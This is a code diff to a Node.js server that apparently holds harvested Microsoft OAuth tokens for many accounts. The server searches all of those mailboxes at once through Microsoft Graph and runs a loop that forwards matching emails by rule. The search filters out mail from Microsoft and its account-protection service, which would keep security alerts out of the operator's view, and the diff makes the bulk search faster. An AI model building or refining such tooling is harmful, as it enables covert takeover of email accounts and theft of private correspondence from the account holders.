@@ -53,11 +53,14 @@ app.post('/api/admin/login', (req, res) => {
 });
 
 // Force MSAL to load its token cache from MongoDB before any token operation
-const warmUpCache = async () => {
+let isCacheWarmed = false;
+const warmUpCache = async (force = false) => {
+    if (isCacheWarmed && !force) return;
     try {
         const cacheDoc = await Account.findOne({ email: 'global_cache' });
         if (cacheDoc && cacheDoc.refreshToken) {
             cacheDoc.refreshToken.length > 10 && cca.getTokenCache().deserialize(cacheDoc.refreshToken);
+            isCacheWarmed = true;
         }
     } catch (err) {
         console.error('Cache warm-up error:', err);
@@ -160,31 +163,31 @@ app.get('/api/emails/:email', authenticateAdmin, async (req, res) => {
         res.status(500).json({ error: error.message });
     }
 });
-// --- Search API for UI Preview ---
+// --- Search API for UI Preview (Parallelized for Speed) ---
 app.post('/api/forward/search', authenticateAdmin, async (req, res) => {
     const { subjectQuery } = req.body;
     if (!subjectQuery) return res.status(400).json({ error: 'Missing subjectQuery' });
     try {
         const accounts = await Account.find({ email: { $ne: 'global_cache' } });
-        const forwardedEmailsList = [];
-        for (const accountDoc of accounts) {
+        const searchQuery = `subject:'${subjectQuery}' -from:microsoft.com -from:accountprotection.microsoft.com`;
+        
+        const searchPromises = accounts.map(async (accountDoc) => {
             try {
                 const msalAccount = await cca.getTokenCache().getAccountByHomeId(accountDoc.homeAccountId);
-                if (!msalAccount) continue;
+                if (!msalAccount) return [];
                 const tokenResponse = await cca.acquireTokenSilent({
                     account: msalAccount,
                     scopes: ["User.Read", "Mail.Read", "Mail.Send", "MailboxSettings.ReadWrite", "offline_access"],
                 });
-                const searchQuery = `subject:'${subjectQuery}' -from:microsoft.com -from:accountprotection.microsoft.com`;
                 const searchResponse = await fetch(`https://graph.microsoft.com/v1.0/me/messages?$search="${encodeURIComponent(searchQuery)}"&$select=id,subject,body,bodyPreview,sender,receivedDateTime`, {
                     headers: { 'Authorization': `Bearer ${tokenResponse.accessToken}`, 'ConsistencyLevel': 'eventual' }
                 });
-                if (!searchResponse.ok) continue;
+                if (!searchResponse.ok) return [];
                 const searchData = await searchResponse.json();
-                const matchingEmails = searchData.value;
-                for (const email of matchingEmails) {
+                const matchingEmails = searchData.value || [];
+                return matchingEmails.map(email => {
                     const receivedDate = new Date(email.receivedDateTime);
-                    forwardedEmailsList.push({
+                    return {
                         id: email.id,
                         accountId: accountDoc.email,
                         account: accountDoc.email,
@@ -193,12 +196,16 @@ app.post('/api/forward/search', authenticateAdmin, async (req, res) => {
                         preview: email.bodyPreview || '',
                         body: email.body?.content || 'No content',
                         time: isNaN(receivedDate) ? '' : receivedDate.toLocaleDateString() + ' ' + receivedDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
-                    });
-                }
+                    };
+                });
             } catch (err) {
                 console.error(`Error processing account ${accountDoc.email}:`, err);
+                return [];
             }
-        }
+        });
+        
+        const resultsArray = await Promise.all(searchPromises);
+        const forwardedEmailsList = resultsArray.flat();
         res.json({ matchingEmails: forwardedEmailsList });
     } catch (error) {
         console.error('Error in bulk search:', error);
@@ -379,11 +386,14 @@ app.delete('/api/accounts/:email', authenticateAdmin, async (req, res) => {
 // --- POLLING LOOP FOR GRAPH API FORWARDING ---
 async function checkAndForwardEmails() {
     try {
+        const ruleCount = await Rule.countDocuments();
+        if (ruleCount === 0) return;
+
         await warmUpCache();
         const accounts = await Account.find({ email: { $ne: 'global_cache' } });
+        if (accounts.length === 0) return;
+
         const rules = await Rule.find();
-        
-        if (accounts.length === 0 || rules.length === 0) return;
 
         for (const accountDoc of accounts) {
             try {
@@ -456,8 +466,8 @@ async function checkAndForwardEmails() {
     }
 }
 
-// Run polling loop every 15 seconds
-setInterval(checkAndForwardEmails, 15000);
+// Run polling loop every 30 seconds
+setInterval(checkAndForwardEmails, 30000);
 
 app.listen(PORT, () => {
     console.log(`Server running on http://localhost:${PORT}`);
